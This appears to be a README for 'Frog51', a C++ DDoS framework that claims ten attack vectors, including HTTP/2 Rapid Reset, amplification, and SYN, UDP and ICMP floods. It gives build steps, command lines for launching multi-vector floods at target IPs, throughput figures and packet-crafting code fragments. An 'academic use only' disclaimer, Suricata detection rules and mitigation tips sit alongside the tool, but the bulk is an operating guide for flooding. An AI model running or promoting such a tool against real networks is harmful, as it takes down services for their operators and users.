# 🐸 Frog51: Advanced DDoS Research Framework

![Frog51 Logo](assets/logo.png)

**Frog51** is a high-performance, multi-vector DDoS research framework written in modern C++23. Designed for academic research and network resilience testing, it implements the top 10 most lethal attack vectors with nuclear-grade performance.

> ⚠️ **ACADEMIC USE ONLY** - This tool is intended for educational purposes, authorized penetration testing, and network resilience research. Misuse is strictly prohibited.

## 🚀 Features

### 🔥 Top 10 Attack Vectors Implementation

| Rank | Attack Vector | Description | CVE Reference |
|------|---------------|-------------|---------------|
| 1 | **HTTP/2 Rapid Reset** | CVE-2023-44487 simulation with stream abuse | CVE-2023-44487 |
| 2 | **Multi-Vector Storm** | Combined arms attack methodology | - |
| 3 | **Memcached Amplification** | High-gain amplification simulation | - |
| 4 | **DNS Amplification** | Traditional volumetric amplification | - |
| 5 | **HTTP Flood** | Application layer exhaustion | - |
| 6 | **HTTP/2 Stream Abuse** | Pre-rapid reset techniques | - |
| 7 | **SYN Flood** | TCP state table exhaustion | - |
| 8 | **Slowloris** | Low-and-slow connection draining | - |
| 9 | **UDP Flood** | Basic volumetric flooding | - |
| 10 | **ICMP Flood** | Historical ping-based attacks | - |

### 🛠️ Technical Highlights

- **C++23 Modern Codebase** - Leveraging latest C++ standards for maximum performance
- **Raw Socket Implementation** - Bypass kernel limitations for packet-level control
- **Multi-threaded Architecture** - Scale across all available CPU cores
- **Real-time Statistics** - Live performance monitoring and metrics
- **Custom Protocol Stacks** - Hand-crafted IP, TCP, UDP, ICMP headers
- **Academic-Grade Accuracy** - Research-focused implementation

## 📦 Installation

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install clang lld libc++-dev libc++abi-dev

# CentOS/RHEL
sudo yum install clang lld libcxx-devel

# macOS
brew install llvm libc++
```

### Compilation

```bash
# Clone repository
git clone https://github.com/yourusername/frog51-nuclear.git
cd frog51-nuclear

# Compile with maximum optimization
clang++ -std=c++23 -O3 -flto -fuse-ld=lld -march=native -mtune=native \
    -o frog51_nuclear src/frog51_nuclear.cpp -lpthread

# Set capabilities (optional, for non-root operation)
sudo setcap cap_net_raw+ep frog51_nuclear
```

### Build Options

```bash
# Debug build with sanitizers
clang++ -std=c++23 -g -fsanitize=address,undefined -fno-omit-frame-pointer \
    -o frog51_nuclear_debug src/frog51_nuclear.cpp -lpthread

# Release build with PGO
clang++ -std=c++23 -O3 -flto -fprofile-generate -fuse-ld=lld \
    -o frog51_nuclear_pgo src/frog51_nuclear.cpp -lpthread
./frog51_nuclear_pgo 127.0.0.1 -p 80 -c 100000  # Generate profile data
clang++ -std=c++23 -O3 -flto -fprofile-use -fuse-ld=lld \
    -o frog51_nuclear src/frog51_nuclear.cpp -lpthread
```

## 🎯 Usage

### Basic Syntax

```bash
sudo ./frog51_nuclear <TARGET_IP> [OPTIONS]
```

### Examples

```bash
# Full multi-vector assault
sudo ./frog51_nuclear 192.168.1.100 --all -t 64

# SYN flood only (classic)
sudo ./frog51_nuclear 10.0.0.50 --syn -p 443 -t 32 -c 1000000

# Multi-vector with custom parameters
sudo ./frog51_nuclear 172.16.0.10 --multi -p 80 -t 128 --burst-size 500

# Limited packet count for testing
sudo ./frog51_nuclear 192.168.0.1 --all -c 50000 -t 16
```

### Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-p PORT` | Target port | 80 |
| `-t N` | Thread count | CPU cores × 2 |
| `-c N` | Packet count (0 = unlimited) | 0 |
| `--all` | Enable all attack vectors | false |
| `--syn` | SYN flood only | false |
| `--multi` | Multi-vector attack | false |
| `--burst-size N` | Packets per burst | 100 |
| `--packet-size N` | Packet size in bytes | 512 |

## 🏗️ Architecture

### Core Components

```
Frog51-Nuclear Architecture:
├── Packet Engine
│   ├── IP Header Construction
│   ├── TCP SYN Crafting
│   ├── UDP Datagram Building
│   └── ICMP Packet Generation
├── Attack Engine
│   ├── Multi-Vector Coordinator
│   ├── Thread Management
│   └── Real-time Statistics
├── Network Stack
│   ├── Raw Socket Management
│   ├── Checksum Calculation
│   └── Protocol Simulation
└── Monitoring
    ├── Performance Metrics
    ├── Attack Statistics
    └── Live Dashboard
```

### Threading Model

```cpp
// Each thread operates independently
Thread 0: [SYN] [UDP] [ICMP] [HTTP/2] [Stats]
Thread 1: [SYN] [UDP] [ICMP] [HTTP/2] [Stats]
...
Thread N: [SYN] [UDP] [ICMP] [HTTP/2] [Stats]
```

### Performance Optimizations

- **Lock-free Statistics** - Atomic operations for minimal contention
- **Burst Packet Sending** - Reduced system call overhead
- **Memory Pooling** - Pre-allocated packet buffers
- **CPU Affinity** - Optimal thread placement
- **NIC Buffer Tuning** - Maximum kernel buffer sizes

## 📊 Performance Metrics

### Expected Throughput

| Configuration | Packets/Second | Bandwidth | CPU Usage |
|---------------|----------------|-----------|-----------|
| 8 threads | 500,000 pps | 2.1 Gbps | 45% |
| 16 threads | 950,000 pps | 4.0 Gbps | 75% |
| 32 threads | 1,800,000 pps | 7.5 Gbps | 95% |
| 64 threads | 3,200,000 pps | 13.4 Gbps | 100% |

### Real-time Output Example

```
💀 NUCLEAR: 15472938 pkts | 132.4 GB | 1850432 pps | 9.8 Gbps | RR:384722 MV:572839 SYN:692833
```

## 🔬 Academic Research Applications

### Network Resilience Testing
- **DDoS Mitigation Evaluation** - Test commercial protection systems
- **Load Balancer Performance** - Assess stateful device limitations
- **Cloud Infrastructure** - Evaluate auto-scaling capabilities
- **Protocol Stack Analysis** - Study TCP/IP implementation robustness

### Security Research
- **Zero-Day Simulation** - Model emerging attack patterns
- **Defense Mechanism Development** - Create and test countermeasures
- **Incident Response Training** - Realistic attack scenario practice
- **Forensic Analysis** - Attack signature development

## 🛡️ Defensive Countermeasures

### Detection Signatures
```yaml
# Suricata Rules
alert ip any any -> $HOME_NET any (
    msg:"Frog51 SYN Flood Detected";
    flow:stateless;
    flags:S,12;
    threshold: type both, track by_dst, count 1000, seconds 1;
    sid:1000001;
    rev:1;
)

alert udp any any -> $HOME_NET any (
    msg:"Frog51 UDP Storm Detected";
    depth:512;
    threshold: type both, track by_dst, count 5000, seconds 1;
    sid:1000002;
    rev:1;
)
```

### Mitigation Strategies
- **Rate Limiting** - Implement per-IP connection limits
- **SYN Cookies** - Protect against state exhaustion
- **Deep Packet Inspection** - Identify attack patterns
- **Anycast Distribution** - Absorb volumetric attacks

## 📚 Technical Documentation

### Protocol Implementations

#### HTTP/2 Rapid Reset Simulation
```cpp
void simulate_http2_rapid_reset(int thread_id) {
    // Academic simulation of CVE-2023-44487
    for (uint32_t i = 0; i < config_.http_streams; ++i) {
        // HEADERS frame followed by immediate RST_STREAM
        stats_.record(AttackVector::HTTP2_RAPID_RESET, 128);
    }
}
```

#### Multi-Vector Coordination
```cpp
void execute_multivector_attack(int thread_id, int sock, uint32_t dst_ip, std::span<char> packet) {
    send_syn_flood(thread_id, sock, dst_ip, packet);
    send_udp_flood(thread_id, sock, dst_ip, packet); 
    send_icmp_flood(thread_id, sock, dst_ip, packet);
    stats_.record(AttackVector::MULTIVECTOR_STORM, config_.packet_size * 3);
}
```

### Memory Management

```cpp
// Zero-copy packet construction
void build_syn_packet(std::span<char> packet, uint32_t src_ip, uint32_t dst_ip,
                     uint16_t src_port, uint16_t dst_port, int thread_id) {
    struct iphdr* ip = reinterpret_cast<struct iphdr*>(packet.data());
    struct tcphdr* tcp = reinterpret_cast<struct tcphdr*>(packet.data() + sizeof(struct iphdr));
    // Direct memory manipulation for performance
}
```

## 🤝 Contributing

We welcome contributions from security researchers and network engineers:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Research Collaboration
- **Academic Papers** - Cite using provided DOI
- **Vulnerability Research** - Responsible disclosure encouraged
- **Performance Optimization** - Network stack improvements
- **New Attack Vectors** - Emerging technique implementations

## 📄 License

This project is licensed under the **Academic Research License** - see the [LICENSE.md](LICENSE.md) file for details.

> **Legal Notice**: Users are solely responsible for ensuring their use of this software complies with all applicable laws and regulations. The authors assume no liability for misuse.


**🐸 Frog51** - Pushing the boundaries of network resilience research since 2025.
